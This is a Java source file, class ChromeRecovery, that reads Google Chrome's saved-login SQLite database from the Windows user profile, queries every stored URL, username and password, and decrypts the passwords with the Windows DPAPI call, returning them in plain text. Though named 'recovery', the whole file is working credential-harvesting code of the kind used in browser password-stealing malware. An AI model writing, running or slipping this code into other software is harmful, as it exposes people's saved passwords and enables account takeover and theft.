package com.elementiumdev.recovery;

import java.io.File;
import java.io.IOException;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

import com.sun.jna.platform.win32.Crypt32Util;

public class ChromeRecovery {
	
	

	public File getPath() {
		return new File(System.getenv("LOCALAPPDATA") + File.separator + "Google" + File.separator + "Chrome" + File.separator + "User Data" + File.separator + "Default" + File.separator + "Login Data");
	}

	public String[] execute() {
		File temp = new File(System.getProperty("java.io.tmpdir") + File.separator + "lgndtttemp");
		
		try {
			Files.copy(getPath().toPath(), temp.toPath(), new CopyOption[] { StandardCopyOption.REPLACE_EXISTING });
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
		java.sql.Connection c = null;
		Statement stmt = null;
		
		try {
			Class.forName("org.sqlite.JDBC");
			c = DriverManager.getConnection("jdbc:sqlite:" + getPath());
		
			c.setAutoCommit(true);
			
			stmt = c.createStatement();
			ResultSet rs = stmt.executeQuery("SELECT action_url,username_value,password_value FROM logins");
			int i = 0;
			while(rs.next()) {
				i++;
			}
			rs.close();
			
			
			stmt = c.createStatement();
			ResultSet rs1 = stmt.executeQuery("SELECT action_url,username_value,password_value FROM logins");
			
			String[] recovered = new String[i];
			i = 0;
			
			while(rs1.next()) {
				recovered[i] = "URL: " + rs1.getString("action_url") + ", Username: " + rs1.getString("username_value") + ", Password: " + new String(getWin32Password(rs1.getBytes("password_value")));
				i++;
			}
			rs1.close();
			
			rs.close();
			stmt.close();
			c.close();
			
			return recovered;
		} catch (Exception e) {
			System.err.println(e.getClass().getName() + ": " + e.getMessage());
			e.printStackTrace();
			
			System.exit(0);
		}
		return new String[0];
	}

	public String getWin32Password(byte[] encryptedData) {
		return new String(Crypt32Util.cryptUnprotectData(encryptedData));
	}
}
